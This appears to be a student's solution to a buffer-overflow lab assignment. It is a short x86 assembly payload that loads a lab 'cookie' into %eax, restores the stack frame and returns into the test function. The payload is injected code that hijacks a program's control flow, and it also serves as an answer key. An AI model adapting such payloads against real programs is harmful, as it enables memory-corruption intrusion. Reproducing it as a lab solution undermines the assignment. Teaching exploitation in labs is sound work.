/* Your exploit code should set your cookie as the return value, restore any corrupted state, push the correct return location on the stack, and execute a ret instruction to really return to test. */
push $0x08048be7
mov %esp, %ebp
addl $0x1c, %ebp
push %ebp
mov %esp, %ebp
mov $0x7786e36c, %eax /* move cookie into %eax */
leave
ret
jmp -508
